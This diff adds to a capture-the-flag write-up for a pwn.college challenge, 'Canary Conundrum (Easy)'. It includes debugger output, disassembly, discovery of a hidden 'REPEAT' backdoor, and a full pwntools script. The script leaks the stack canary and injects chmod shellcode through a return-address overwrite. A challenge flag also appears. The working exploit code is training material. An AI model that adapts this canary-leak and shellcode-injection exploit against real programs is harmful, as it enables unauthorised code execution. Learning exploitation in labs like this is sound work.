@@ -631,7 +631,7 @@ shellcode_asm = """
    pop rdi
    pop rax
    mov si, 0x1ff
-	syscall
+   syscall
 """
 
 shellcode = asm(shellcode_asm)
@@ -10064,3 +10064,617 @@ Goodbye!
 You win! Here is your flag:
 pwn.college{w6VFD6ynO9FNrkx1MGQ3P_3vFyz.0FOxMDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Canary Conundrum (Easy)
+
+```
+hacker@program-security~canary-conundrum-easy:/$ /challenge/canary-conundrum-easy 
+###
+### Welcome to /challenge/canary-conundrum-easy!
+###
+
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffd48e41000 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffd48e41008 (rsp+0x0008) | c8 21 e4 48 fd 7f 00 00 | 0x00007ffd48e421c8 |
+| 0x00007ffd48e41010 (rsp+0x0010) | b8 21 e4 48 fd 7f 00 00 | 0x00007ffd48e421b8 |
+| 0x00007ffd48e41018 (rsp+0x0018) | 10 80 02 57 01 00 00 00 | 0x0000000157028010 |
+| 0x00007ffd48e41020 (rsp+0x0020) | 40 c5 03 72 d4 72 00 00 | 0x000072d47203c540 |
+| 0x00007ffd48e41028 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41030 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41038 (rsp+0x0038) | 40 10 e4 48 fd 7f 00 00 | 0x00007ffd48e41040 |
+| 0x00007ffd48e41040 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41048 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41050 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41058 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41060 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41068 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41070 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41078 (rsp+0x0078) | 00 2a 0a 32 31 31 19 cf | 0xcf193131320a2a00 |
+| 0x00007ffd48e41080 (rsp+0x0080) | c0 20 e4 48 fd 7f 00 00 | 0x00007ffd48e420c0 |
+| 0x00007ffd48e41088 (rsp+0x0088) | 46 57 02 57 cf 5b 00 00 | 0x00005bcf57025746 |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7ffd48e41000, and our base pointer points to 0x7ffd48e41080.
+This means that we have (decimal) 18 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 144 bytes.
+The input buffer begins at 0x7ffd48e41040, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 56 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+We have disabled the following standard memory corruption mitigations for this challenge:
+- the stack is executable. This means that if the stack contains shellcode
+and you overwrite the return address with the address of that shellcode, it will execute.
+
+Payload size: 2
+You have chosen to send 2 bytes of input!
+This will allow you to write from 0x7ffd48e41040 (the start of the input buffer)
+right up to (but not including) 0x7ffd48e41042 (which is -54 bytes beyond the end of the buffer).
+Send your payload (up to 2 bytes)!
+aa
+You sent 2 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffd48e41000 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffd48e41008 (rsp+0x0008) | c8 21 e4 48 fd 7f 00 00 | 0x00007ffd48e421c8 |
+| 0x00007ffd48e41010 (rsp+0x0010) | b8 21 e4 48 fd 7f 00 00 | 0x00007ffd48e421b8 |
+| 0x00007ffd48e41018 (rsp+0x0018) | 10 80 02 57 01 00 00 00 | 0x0000000157028010 |
+| 0x00007ffd48e41020 (rsp+0x0020) | 40 c5 03 72 d4 72 00 00 | 0x000072d47203c540 |
+| 0x00007ffd48e41028 (rsp+0x0028) | 00 00 00 00 02 00 00 00 | 0x0000000200000000 |
+| 0x00007ffd48e41030 (rsp+0x0030) | 02 00 00 00 00 00 00 00 | 0x0000000000000002 |
+| 0x00007ffd48e41038 (rsp+0x0038) | 40 10 e4 48 fd 7f 00 00 | 0x00007ffd48e41040 |
+| 0x00007ffd48e41040 (rsp+0x0040) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
+| 0x00007ffd48e41048 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41050 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41058 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41060 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41068 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41070 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffd48e41078 (rsp+0x0078) | 00 2a 0a 32 31 31 19 cf | 0xcf193131320a2a00 |
+| 0x00007ffd48e41080 (rsp+0x0080) | c0 20 e4 48 fd 7f 00 00 | 0x00007ffd48e420c0 |
+| 0x00007ffd48e41088 (rsp+0x0088) | 46 57 02 57 cf 5b 00 00 | 0x00005bcf57025746 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7ffd48e41040
+- the saved frame pointer (of main) is at 0x7ffd48e41080
+- the saved return address (previously to main) is at 0x7ffd48e41088
+- the saved return address is now pointing to 0x5bcf57025746.
+- the canary is stored at 0x7ffd48e41078.
+- the canary value is now 0xcf193131320a2a00.
+
+You said: aa
+This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
+call to see the hidden backdoor!
+Goodbye!
+### Goodbye!
+```
+
+Let's look at what security mitigations are enabled.
+
+```
+hacker@program-security~canary-conundrum-easy:/$ checksec /challenge/canary-conundrum-easy 
+[*] '/challenge/canary-conundrum-easy'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        PIE enabled
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x00000000000010e0  __cxa_finalize@plt
+0x00000000000010f0  putchar@plt
+0x0000000000001100  __errno_location@plt
+0x0000000000001110  puts@plt
+0x0000000000001120  __stack_chk_fail@plt
+0x0000000000001130  printf@plt
+0x0000000000001140  read@plt
+0x0000000000001150  setvbuf@plt
+0x0000000000001160  __isoc99_scanf@plt
+0x0000000000001170  exit@plt
+0x0000000000001180  strerror@plt
+0x0000000000001190  strstr@plt
+0x00000000000011a0  _start
+0x00000000000011d0  deregister_tm_clones
+0x0000000000001200  register_tm_clones
+0x0000000000001240  __do_global_dtors_aux
+0x0000000000001280  frame_dummy
+0x0000000000001289  DUMP_STACK
+0x000000000000148c  bin_padding
+0x00000000000021f9  challenge
+0x0000000000002671  main
+0x0000000000002770  __libc_csu_init
+0x00000000000027e0  __libc_csu_fini
+0x00000000000027e8  _fini
+```
+
+This time there is no `win*()` function, which means we have to pass shellcode in our payload and return control flow to our shellcode.
+
+The challenge tells us that there is a hidden backdoor after the call to `puts()` is made in order to print said hint.
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+
+# ---- snip ----
+
+   0x000000000000249f <+678>:   mov    rdx,QWORD PTR [rbp-0x50]
+   0x00000000000024a3 <+682>:   mov    rax,QWORD PTR [rbp-0x48]
+   0x00000000000024a7 <+686>:   mov    rsi,rax
+   0x00000000000024aa <+689>:   mov    edi,0x0
+   0x00000000000024af <+694>:   call   0x1140 <read@plt>
+
+# ---- snip ----
+
+   0x000000000000260a <+1041>:  call   0x1110 <puts@plt>
+   0x000000000000260f <+1046>:  mov    rax,QWORD PTR [rbp-0x48]
+   0x0000000000002613 <+1050>:  lea    rsi,[rip+0x11df]        # 0x37f9
+   0x000000000000261a <+1057>:  mov    rdi,rax
+   0x000000000000261d <+1060>:  call   0x1190 <strstr@plt>
+   0x0000000000002622 <+1065>:  test   rax,rax
+   0x0000000000002625 <+1068>:  je     0x264a <challenge+1105>
+   0x0000000000002627 <+1070>:  lea    rdi,[rip+0x11d2]        # 0x3800
+   0x000000000000262e <+1077>:  call   0x1110 <puts@plt>
+   0x0000000000002633 <+1082>:  mov    rdx,QWORD PTR [rbp-0x78]
+   0x0000000000002637 <+1086>:  mov    rcx,QWORD PTR [rbp-0x70]
+   0x000000000000263b <+1090>:  mov    eax,DWORD PTR [rbp-0x64]
+   0x000000000000263e <+1093>:  mov    rsi,rcx
+   0x0000000000002641 <+1096>:  mov    edi,eax
+   0x0000000000002643 <+1098>:  call   0x21f9 <challenge>
+   0x0000000000002648 <+1103>:  jmp    0x265b <challenge+1122>
+   0x000000000000264a <+1105>:  lea    rdi,[rip+0x11d9]        # 0x382a
+   0x0000000000002651 <+1112>:  call   0x1110 <puts@plt>
+   0x0000000000002656 <+1117>:  mov    eax,0x0
+   0x000000000000265b <+1122>:  mov    rcx,QWORD PTR [rbp-0x8]
+   0x000000000000265f <+1126>:  xor    rcx,QWORD PTR fs:0x28
+   0x0000000000002668 <+1135>:  je     0x266f <challenge+1142>
+   0x000000000000266a <+1137>:  call   0x1120 <__stack_chk_fail@plt>
+   0x000000000000266f <+1142>:  leave
+   0x0000000000002670 <+1143>:  ret
+End of assembler dump.
+```
+
+```
+First execution rbp:
+0x00007ffe3389c940
+
+Second execution rbp:
+0x00007ffe3389b900
+```
+
+The challenge calls `strstr@plt` in order to find a substring `needle` within the string `haystack`. The string address is stored at `rbp-0x48` which is where our buffer is stored as well. So it looks for some substring within our string.
+
+Then if it finds the substring, it calls itself again at `challenge+1098`. Otherwise it exits.
+
+Let's see what substring it expects, because if we successfully pass it, we will get the canary value and also another chance to send the actual payload.
+
+```
+pwndbg> break *(challenge+1060)
+Breakpoint 1 at 0x261d
+```
+
+```
+pwndbg> run
+Starting program: /challenge/canary-conundrum-easy 
+
+# ---- snip ----
+
+Payload size: 2
+
+# ---- snip ----
+
+Send your payload (up to 2 bytes)!
+aa
+
+# ---- snip ----
+
+You said: aa
+This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
+call to see the hidden backdoor!
+
+Breakpoint 1, 0x00005c128502861d in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+──────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────
+ RAX  0x7ffee4afad30 ◂— 0x6161 /* 'aa' */
+ RBX  0x5c1285028770 (__libc_csu_init) ◂— endbr64 
+ RCX  0x791a9801d297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0
+ RDI  0x7ffee4afad30 ◂— 0x6161 /* 'aa' */
+ RSI  0x5c12850297f9 ◂— 0x4200544145504552 /* 'REPEAT' */
+ R8   0x21
+ R9   0xd
+ R10  0x5c128502976b ◂— 0x696854000000000a /* '\n' */
+ R11  0x246
+ R12  0x5c12850271a0 (_start) ◂— endbr64 
+ R13  0x7ffee4afbea0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffee4afad70 —▸ 0x7ffee4afbdb0 ◂— 0
+ RSP  0x7ffee4afacf0 ◂— 0xd68 /* 'h\r' */
+ RIP  0x5c128502861d (challenge+1060) ◂— call strstr@plt
+───────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────
+ ► 0x5c128502861d <challenge+1060>    call   strstr@plt                  <strstr@plt>
+        haystack: 0x7ffee4afad30 ◂— 0x6161 /* 'aa' */
+        needle: 0x5c12850297f9 ◂— 0x4200544145504552 /* 'REPEAT' */
+ 
+   0x5c1285028622 <challenge+1065>    test   rax, rax
+   0x5c1285028625 <challenge+1068>    je     challenge+1105              <challenge+1105>
+ 
+   0x5c1285028627 <challenge+1070>    lea    rdi, [rip + 0x11d2]     RDI => 0x5c1285029800 ◂— 'Backdoor triggered! Repeating challenge()'
+   0x5c128502862e <challenge+1077>    call   puts@plt                    <puts@plt>
+ 
+   0x5c1285028633 <challenge+1082>    mov    rdx, qword ptr [rbp - 0x78]
+   0x5c1285028637 <challenge+1086>    mov    rcx, qword ptr [rbp - 0x70]
+   0x5c128502863b <challenge+1090>    mov    eax, dword ptr [rbp - 0x64]
+   0x5c128502863e <challenge+1093>    mov    rsi, rcx
+   0x5c1285028641 <challenge+1096>    mov    edi, eax
+   0x5c1285028643 <challenge+1098>    call   challenge                   <challenge>
+────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffee4afacf0 ◂— 0xd68 /* 'h\r' */
+01:0008│-078 0x7ffee4afacf8 —▸ 0x7ffee4afbeb8 —▸ 0x7ffee4afd692 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-070 0x7ffee4afad00 —▸ 0x7ffee4afbea8 —▸ 0x7ffee4afd671 ◂— '/challenge/canary-conundrum-easy'
+03:0018│-068 0x7ffee4afad08 ◂— 0x18502b010
+04:0020│-060 0x7ffee4afad10 —▸ 0x791a98102540 ◂— 0x791a98102540
+05:0028│-058 0x7ffee4afad18 ◂— 0x200000000
+06:0030│-050 0x7ffee4afad20 ◂— 2
+07:0038│-048 0x7ffee4afad28 —▸ 0x7ffee4afad30 ◂— 0x6161 /* 'aa' */
+──────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5c128502861d challenge+1060
+   1   0x5c1285028746 main+213
+   2   0x791a97f33083 __libc_start_main+243
+   3   0x5c12850271ce _start+46
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+We can see that the expected substring is `REPEAT`.
+
+Since we will make the program calll itself again by sending the `REPEAT` substring in our payload, the frame will be different for the second invocation.
+This means that when we overwrite the sotred return address, we have to overwrite it with the buffer address of the new frame.
+
+Let's see how this works.
+
+#### Analyzing distance between the buffer of the old and the new frames
+
+```
+hacker@program-security~canary-conundrum-easy:/$ /challenge/canary-conundrum-easy 
+###
+### Welcome to /challenge/canary-conundrum-easy!
+###
+
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff66548ca0 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff66548ca8 (rsp+0x0008) | 68 9e 54 66 ff 7f 00 00 | 0x00007fff66549e68 |
+| 0x00007fff66548cb0 (rsp+0x0010) | 58 9e 54 66 ff 7f 00 00 | 0x00007fff66549e58 |
+| 0x00007fff66548cb8 (rsp+0x0018) | 10 80 12 75 01 00 00 00 | 0x0000000175128010 |
+| 0x00007fff66548cc0 (rsp+0x0020) | 40 b5 40 0c e6 77 00 00 | 0x000077e60c40b540 |
+| 0x00007fff66548cc8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548cd0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548cd8 (rsp+0x0038) | e0 8c 54 66 ff 7f 00 00 | 0x00007fff66548ce0 |
+| 0x00007fff66548ce0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548ce8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548cf0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548cf8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548d00 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548d08 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548d10 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548d18 (rsp+0x0078) | 00 c4 a3 62 c6 55 1d d1 | 0xd11d55c662a3c400 |
+| 0x00007fff66548d20 (rsp+0x0080) | 60 9d 54 66 ff 7f 00 00 | 0x00007fff66549d60 |
+| 0x00007fff66548d28 (rsp+0x0088) | 46 57 12 75 d2 5f 00 00 | 0x00005fd275125746 |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7fff66548ca0, and our base pointer points to 0x7fff66548d20.
+This means that we have (decimal) 18 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 144 bytes.
+The input buffer begins at 0x7fff66548ce0, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 56 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+We have disabled the following standard memory corruption mitigations for this challenge:
+- the stack is executable. This means that if the stack contains shellcode
+and you overwrite the return address with the address of that shellcode, it will execute.
+
+Payload size: 6
+You have chosen to send 6 bytes of input!
+This will allow you to write from 0x7fff66548ce0 (the start of the input buffer)
+right up to (but not including) 0x7fff66548ce6 (which is -50 bytes beyond the end of the buffer).
+Send your payload (up to 6 bytes)!
+REPEAT
+You sent 6 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff66548ca0 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff66548ca8 (rsp+0x0008) | 68 9e 54 66 ff 7f 00 00 | 0x00007fff66549e68 |
+| 0x00007fff66548cb0 (rsp+0x0010) | 58 9e 54 66 ff 7f 00 00 | 0x00007fff66549e58 |
+| 0x00007fff66548cb8 (rsp+0x0018) | 10 80 12 75 01 00 00 00 | 0x0000000175128010 |
+| 0x00007fff66548cc0 (rsp+0x0020) | 40 b5 40 0c e6 77 00 00 | 0x000077e60c40b540 |
+| 0x00007fff66548cc8 (rsp+0x0028) | 00 00 00 00 06 00 00 00 | 0x0000000600000000 |
+| 0x00007fff66548cd0 (rsp+0x0030) | 06 00 00 00 00 00 00 00 | 0x0000000000000006 |
+| 0x00007fff66548cd8 (rsp+0x0038) | e0 8c 54 66 ff 7f 00 00 | 0x00007fff66548ce0 |
+| 0x00007fff66548ce0 (rsp+0x0040) | 52 45 50 45 41 54 00 00 | 0x0000544145504552 |
+| 0x00007fff66548ce8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548cf0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548cf8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548d00 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548d08 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548d10 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548d18 (rsp+0x0078) | 00 c4 a3 62 c6 55 1d d1 | 0xd11d55c662a3c400 |
+| 0x00007fff66548d20 (rsp+0x0080) | 60 9d 54 66 ff 7f 00 00 | 0x00007fff66549d60 |
+| 0x00007fff66548d28 (rsp+0x0088) | 46 57 12 75 d2 5f 00 00 | 0x00005fd275125746 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fff66548ce0
+- the saved frame pointer (of main) is at 0x7fff66548d20
+- the saved return address (previously to main) is at 0x7fff66548d28
+- the saved return address is now pointing to 0x5fd275125746.
+- the canary is stored at 0x7fff66548d18.
+- the canary value is now 0xd11d55c662a3c400.
+
+You said: REPEAT
+This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
+call to see the hidden backdoor!
+Backdoor triggered! Repeating challenge()
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff66548c10 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff66548c18 (rsp+0x0008) | 68 9e 54 66 ff 7f 00 00 | 0x00007fff66549e68 |
+| 0x00007fff66548c20 (rsp+0x0010) | 58 9e 54 66 ff 7f 00 00 | 0x00007fff66549e58 |
+| 0x00007fff66548c28 (rsp+0x0018) | 00 68 12 75 01 00 00 00 | 0x0000000175126800 |
+| 0x00007fff66548c30 (rsp+0x0020) | 10 80 12 75 d2 5f 00 00 | 0x00005fd275128010 |
+| 0x00007fff66548c38 (rsp+0x0028) | a0 14 40 0c e6 77 00 00 | 0x000077e60c4014a0 |
+| 0x00007fff66548c40 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548c48 (rsp+0x0038) | 50 8c 54 66 ff 7f 00 00 | 0x00007fff66548c50 |
+| 0x00007fff66548c50 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548c58 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548c60 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548c68 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548c70 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548c78 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548c80 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff66548c88 (rsp+0x0078) | 00 c4 a3 62 c6 55 1d d1 | 0xd11d55c662a3c400 |
+| 0x00007fff66548c90 (rsp+0x0080) | 20 8d 54 66 ff 7f 00 00 | 0x00007fff66548d20 |
+| 0x00007fff66548c98 (rsp+0x0088) | 48 56 12 75 d2 5f 00 00 | 0x00005fd275125648 |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7fff66548c10, and our base pointer points to 0x7fff66548c90.
+This means that we have (decimal) 18 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 144 bytes.
+The input buffer begins at 0x7fff66548c50, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 56 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+We have disabled the following standard memory corruption mitigations for this challenge:
+- the stack is executable. This means that if the stack contains shellcode
+and you overwrite the return address with the address of that shellcode, it will execute.
+
+Payload size: 
+```
+
+We can see that the buffer of the first frame was at `0x7fff66548ce0`, whereas the one for the second one was at `0x7fff66548c50`.
+Let's calculate the offset.
+
+```
+pwndbg> p 0x7fff66548ce0 - 0x7fff66548c50
+$1 = 144
+```
+
+Now, in our exploit, after we extract the buffer address of the first invoked `challenge()` frame, we have to subtract `144` from it in order to get the address of the buffer in the second invocation, and thus get the address of our shellcode.
+
+
+### Exploit
+
+```
+hacker@program-security~canary-conundrum-easy:~$ ln -sf /flag ~/Z
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+p = process("/challenge/canary-conundrum-easy")
+
+# Initialize values
+buffer_addr = 0x7fff1917e570
+canary_addr = 0x7fff1917e5a8
+addr_of_saved_ip = 0x7fff1917e5b8
+offset_buffers_diff_challenge_frames = 144
+
+# --- STAGE 1: LEAK CANARY ---
+# Calculate offset_to_canary and payload_size
+offset_to_canary = canary_addr - buffer_addr
+payload_size = offset_to_canary + 1
+
+# Send payload_size
+p.recvuntil(b"Payload size: ")
+p.sendline(str(payload_size).encode())
+
+# Craft payload
+payload = b"REPEAT"
+payload += b"A" * (offset_to_canary - 6)
+payload += b"B"
+
+# Send payload
+p.recvuntil(b"bytes)!")
+p.send(payload)
+
+# Extract canary
+output = p.recvuntil(b'AAAAAB')
+output_str = output.decode()
+
+canary_raw = p.recv(7)
+canary = u64(canary_raw.rjust(8, b'\x00'))
+actual_buffer_addr_during_stage_1 = int(re.search(r"the input buffer starts at (0x[0-9a-fA-F]+)", output_str).group(1), 16)
+
+print(f"Canary : {hex(canary)}")
+print(f"Actual buffer address during stage 1: {hex(actual_buffer_addr_during_stage_1)}")
+
+
+# --- STAGE 2: FINAL PAYLOAD ---
+# Shellcode
+shellcode_asm = """
+   /* chmod("z", 0004) */
+   push 0x5a
+   push rsp
+   pop rdi
+   pop rax
+   mov sil, 0x4
+   syscall
+"""
+shellcode_address = actual_buffer_addr_during_stage_1 - offset_buffers_diff_challenge_frames
+shellcode = asm(shellcode_asm)
+print(f"Shellcode length: {len(shellcode)}")
+
+# Calculate offset_to_ret and payload_size
+offset_to_ret = addr_of_saved_ip - (canary_addr + 8)
+payload_size = offset_to_canary + 8 + offset_to_ret + 8
+
+# Send payload size
+p.sendline(str(payload_size).encode())
+
+# Craft payload
+payload = shellcode
+payload += b"A" * (offset_to_canary - len(shellcode))
+payload += p64(canary)
+payload += b"B" * offset_to_ret
+payload += p64(shellcode_address)
+
+# Send payload
+p.recvuntil(b"bytes)!")
+p.send(payload)
+
+p.interactive()
+```
+
+```
+hacker@program-security~canary-conundrum-easy:~$ python ~/script.py 
+Canary : 0x7ff151a547df7d00
+Actual buffer address during stage 1: 0x7ffe97f2b430
+Shellcode length: 10
+
+You sent 80 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffe97f2b360 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffe97f2b368 (rsp+0x0008) | b8 c5 f2 97 fe 7f 00 00 | 0x00007ffe97f2c5b8 |
+| 0x00007ffe97f2b370 (rsp+0x0010) | a8 c5 f2 97 fe 7f 00 00 | 0x00007ffe97f2c5a8 |
+| 0x00007ffe97f2b378 (rsp+0x0018) | 00 38 6a 7e 01 00 00 00 | 0x000000017e6a3800 |
+| 0x00007ffe97f2b380 (rsp+0x0020) | 10 50 6a 7e ad 5d 00 00 | 0x00005dad7e6a5010 |
+| 0x00007ffe97f2b388 (rsp+0x0028) | a0 04 cc 98 50 00 00 00 | 0x0000005098cc04a0 |
+| 0x00007ffe97f2b390 (rsp+0x0030) | 50 00 00 00 00 00 00 00 | 0x0000000000000050 |
+| 0x00007ffe97f2b398 (rsp+0x0038) | a0 b3 f2 97 fe 7f 00 00 | 0x00007ffe97f2b3a0 |
+| 0x00007ffe97f2b3a0 (rsp+0x0040) | 6a 5a 54 5f 58 40 b6 04 | 0x04b640585f545a6a |
+| 0x00007ffe97f2b3a8 (rsp+0x0048) | 0f 05 41 41 41 41 41 41 | 0x414141414141050f |
+| 0x00007ffe97f2b3b0 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe97f2b3b8 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe97f2b3c0 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe97f2b3c8 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe97f2b3d0 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe97f2b3d8 (rsp+0x0078) | 00 7d df 47 a5 51 f1 7f | 0x7ff151a547df7d00 |
+| 0x00007ffe97f2b3e0 (rsp+0x0080) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffe97f2b3e8 (rsp+0x0088) | a0 b3 f2 97 fe 7f 00 00 | 0x00007ffe97f2b3a0 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7ffe97f2b3a0
+- the saved frame pointer (of main) is at 0x7ffe97f2b3e0
+- the saved return address (previously to main) is at 0x7ffe97f2b3e8
+- the saved return address is now pointing to 0x7ffe97f2b3a0.
+- the canary is stored at 0x7ffe97f2b3d8.
+- the canary value is now 0x7ff151a547df7d00.
+
+You said: jZT_X@\xb6\x04\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
+call to see the hidden backdoor!
